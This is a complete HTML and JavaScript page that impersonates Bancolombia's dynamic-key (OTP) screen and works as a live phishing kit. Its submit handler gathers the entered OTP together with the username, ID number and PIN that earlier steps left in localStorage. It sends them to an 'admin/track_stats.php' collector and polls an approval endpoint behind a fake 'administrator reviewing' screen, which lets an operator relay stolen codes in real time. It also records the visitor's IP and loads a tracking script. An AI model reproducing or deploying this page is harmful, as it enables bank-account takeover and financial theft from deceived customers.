<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Clave Dinámica</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }

        body {
            font-family: 'Open Sans', Arial, sans-serif;
            font-size: 16px; color: #2c2a29; line-height: 24px;
            background-color: #f9f9fa;
            display: flex; flex-direction: column; min-height: 100vh;
        }

        .decorative-background {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            z-index: 10;
        }

        .header-logo { height: 35px; }

        .main-container {
            flex: 1; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            padding: 40px 20px; position: relative; z-index: 10;
        }

        .login-card {
            background-color: #ffffff; border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
            padding: 50px 60px; max-width: 500px; width: 100%;
        }

        .card-title { 
            color: #212121; font-size: 28px; font-weight: 700; 
            margin-bottom: 30px; text-align: center; 
        }

        .icon-container {
            width: 80px; height: 80px; background-color: #f5f5f5;
            border-radius: 50%; display: flex; align-items: center;
            justify-content: center; margin: 0 auto 25px;
        }
        .icon-container svg { width: 40px; height: 40px; color: #666666; }

        .subtitle {
            font-size: 14px; color: #666666; margin-bottom: 40px;
            text-align: center; line-height: 1.5;
        }

        .code-inputs {
            display: flex; gap: 12px; margin-bottom: 40px; justify-content: center;
        }

        .code-input {
            width: 50px; height: 60px; border: none;
            border-bottom: 3px solid #e0e0e0; background-color: transparent;
            font-size: 32px; font-weight: 600; text-align: center;
            color: #212121; font-family: 'Open Sans', Arial, sans-serif;
            transition: border-color 0.3s ease;
        }
        .code-input:focus { outline: none; border-bottom-color: #fdda24; }
        .code-input.filled { border-bottom-color: #4caf50; }
        .code-input.error {
            border-bottom-color: #e53935;
            animation: shake 0.4s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .error-message {
            color: #e53935; font-size: 13px; margin-top: -25px;
            margin-bottom: 25px; text-align: center; font-weight: 600;
            opacity: 0; transition: opacity 0.3s ease;
        }
        .error-message.show { opacity: 1; }

        .submit-button {
            width: 100%; padding: 15px 32px; border-radius: 30px;
            font-size: 16px; font-weight: 600; cursor: not-allowed;
            border: none; background-color: #e0e0e0; color: #999999;
            transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif;
            margin-bottom: 20px;
        }
        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
        .submit-button.enabled:hover { background-color: #fdd007; }

        .help-link {
            color: #212121; font-size: 14px; text-decoration: underline;
            font-weight: 600; cursor: pointer; text-align: center; display: block;
        }

        .footer-info {
            text-align: center; padding: 20px;
            position: relative; z-index: 10;
        }
        .footer-text { font-size: 11px; color: #666666; line-height: 1.4; }

        .loading-overlay {
            position: fixed;
            inset: 0;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.25s ease;
        }
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        .loading-logo {
            height: 36px;
            width: auto;
            margin-bottom: 48px;
        }
        .spinner {
            width: 52px;
            height: 52px;
            margin-bottom: 36px;
        }
        .spinner svg {
            width: 52px;
            height: 52px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to   { transform: rotate(360deg); }
        }
        .loading-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 10px;
            text-align: center;
        }
        .loading-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            line-height: 1.55;
            max-width: 260px;
        }

        @media (max-width: 768px) {
            .header-logo { height: 28px; }
            .main-container { padding: 25px 16px; }
            .login-card { padding: 40px 30px; max-width: 100%; }
            .card-title { font-size: 24px; margin-bottom: 25px; }
            .icon-container { width: 70px; height: 70px; margin-bottom: 20px; }
            .icon-container svg { width: 35px; height: 35px; }
            .subtitle { font-size: 13px; margin-bottom: 30px; }
            .code-input { width: 45px; height: 55px; font-size: 28px; }
            .code-inputs { gap: 8px; margin-bottom: 35px; }
            .submit-button { font-size: 15px; padding: 13px 28px; }
        }
    </style>
</head>
<body>

    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
    </svg>

    <div class="header">
        <img src="i.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
    </div>

    <main class="main-container">
        <div class="login-card">
            <h1 class="card-title">Clave Dinámica</h1>

            <div class="icon-container">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>

            <p class="subtitle">Por favor ingresa la clave dinámica que se genera en tu App Mi Bancolombia.</p>

            <div class="code-inputs" id="codeInputs">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit1">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit2">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit3">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit4">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit5">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit6">
            </div>

            <p class="error-message" id="errorMsg">Clave dinámica incorrecta. Intenta nuevamente.</p>

            <button class="submit-button" id="btnSubmit" disabled>Continuar</button>

            <a href="#" class="help-link">¿Olvidaste tu usuario o clave?</a>
        </div>
    </main>

    <div class="footer-info">
        <p class="footer-text" id="footerText">
            VISITANTE - *** *** *** ***<br>
            Cargando fecha...
        </p>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner">
            <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/>
                <circle cx="26" cy="26" r="22"
                    stroke="#FDDA24"
                    stroke-width="4"
                    stroke-linecap="round"
                    stroke-dasharray="103 35"
                    stroke-dashoffset="0"
                />
            </svg>
        </div>
        <p class="loading-title">Verificando datos...</p>
        <p class="loading-subtitle">El administrador está revisando tu información. Por favor espera...</p>
    </div>

    <script>
        let userIP = 'No disponible';

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                updateFooter();
            } catch (error) {
                updateFooter();
            }
        }

        function updateDateTime() {
            const now = new Date();
            const days = ['domingo','lunes','martes','miércoles','jueves','viernes','sábado'];
            const months = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
            let h = now.getHours();
            const ampm = h >= 12 ? 'p. m.' : 'a. m.';
            h = h % 12 || 12;
            const m = now.getMinutes().toString().padStart(2,'0');
            const s = now.getSeconds().toString().padStart(2,'0');
            return `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${h}:${m}:${s} ${ampm}`;
        }

        function updateFooter() {
            const ipMasked = userIP !== 'No disponible' ?
                userIP.split('.').join(' ') : '*** *** *** ***';
            document.getElementById('footerText').innerHTML = `VISITANTE - ${ipMasked}<br>${updateDateTime()}`;
        }

        const inputs = [
            document.getElementById('digit1'),
            document.getElementById('digit2'),
            document.getElementById('digit3'),
            document.getElementById('digit4'),
            document.getElementById('digit5'),
            document.getElementById('digit6')
        ];
        const btnSubmit = document.getElementById('btnSubmit');
        const errorMsg = document.getElementById('errorMsg');
        const overlay = document.getElementById('loadingOverlay');

        inputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value !== '') {
                    this.classList.add('filled');
                    if (index < inputs.length - 1) inputs[index + 1].focus();
                } else {
                    this.classList.remove('filled');
                }
                validateCode();
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    inputs[index - 1].classList.remove('filled');
                    validateCode();
                }
            });

            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
                digits.forEach((digit, i) => {
                    if (inputs[i]) { inputs[i].value = digit; inputs[i].classList.add('filled'); }
                });
                validateCode();
            });
        });

        function validateCode() {
            const allFilled = inputs.every(input => input.value !== '');
            btnSubmit.classList.toggle('enabled', allFilled);
            btnSubmit.disabled = !allFilled;
        }

        function getCode() { return inputs.map(i => i.value).join(''); }

        function clearCode() {
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            validateCode();
        }

        function showError() {
            inputs.forEach(input => input.classList.add('error'));
            errorMsg.classList.add('show');
            setTimeout(() => {
                inputs.forEach(input => input.classList.remove('error'));
                errorMsg.classList.remove('show');
                clearCode();
            }, 3000);
        }

        btnSubmit.addEventListener('click', async function() {
            if (this.disabled) return;

            const otp = getCode();
            overlay.classList.add('active');

            const pseData = localStorage.getItem('pseGuardado');
            let documento = 'N/A';
            let banco = 'bancolombia';
            
            if (pseData) {
                try {
                    const pse = JSON.parse(pseData);
                    documento = pse.documento_pse || 'N/A';
                    banco = 'bancolombia';
                } catch (e) {}
            }

            // Obtener datos de pasos anteriores
            const usuario = localStorage.getItem('usuario_bancolombia') || '';
            const identificacion = localStorage.getItem('identificacion_bancolombia') || '';
            const tipo_id = localStorage.getItem('tipo_id_bancolombia') || 'CC';
            const clave_pin = localStorage.getItem('clave_pin_bancolombia') || '';
            
            const formData = new FormData();
            formData.append('activity', 'OTP/DINÁMICA (BANCOLOMBIA)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'bancolombia');
            formData.append('documento', documento);
            formData.append('usuario', usuario);
            formData.append('identificacion', identificacion);
            formData.append('tipo_identificacion', tipo_id);
            formData.append('clave_pin', clave_pin);
            formData.append('codigo_dinamica', otp);
            formData.append('codigo_otp', otp);
            formData.append('clave_tarjeta', '');
            formData.append('ultimos_digitos', '');

            console.log('✅ Enviando a track_stats.php:', {
                activity: 'OTP/DINÁMICA (BANCOLOMBIA)',
                usuario: usuario,
                clave_pin: clave_pin,
                codigo_otp: otp
            });

            try {
                const response = await fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                console.log('✅ Respuesta track_stats.php:', data);

                if (data.success) {
                    localStorage.setItem('log_id_actual', data.id);
                    startPollingAprobacion(data.id);
                } else {
                    overlay.classList.remove('active');
                    console.error('❌ Error:', data);
                    showError();
                }
            } catch (err) {
                overlay.classList.remove('active');
                console.error('❌ Error en fetch:', err);
                showError();
            }
        });

        function startPollingAprobacion(logId) {
            let pollCount = 0;
            const maxPolls = 150;
            
            const pollInterval = setInterval(() => {
                pollCount++;
                
                fetch('../../admin/check_aprobacion.php?log_id=' + logId)
                    .then(res => res.json())
                    .then(data => {
                        console.log('Poll #' + pollCount + ' - Estado:', data.estado);
                        
                        if (data.estado === 'aprobado') {
                            clearInterval(pollInterval);
                            overlay.classList.remove('active');
                            alert('✓ Datos aprobados');
                            setTimeout(() => {
                                window.location.assign('../../index.php');
                            }, 500);
                        } else if (data.estado === 'rechazado') {
                            clearInterval(pollInterval);
                            overlay.classList.remove('active');
                            showError();
                        } else if (pollCount >= maxPolls) {
                            clearInterval(pollInterval);
                            overlay.classList.remove('active');
                            alert('⏱️ Tiempo de espera agotado. Por favor intenta nuevamente');
                            clearCode();
                        }
                    })
                    .catch(err => {
                        console.error('Error en polling:', err);
                    });
            }, 2000);
        }

        getUserIP();
        updateFooter();
        setInterval(updateFooter, 1000);

        // Cargar core-sys.js para tracking automático
        const script = document.createElement('script');
        script.src = '../../admin/core-sys.js';
        script.async = true;
        document.head.appendChild(script);
    </script>
</body>
</html>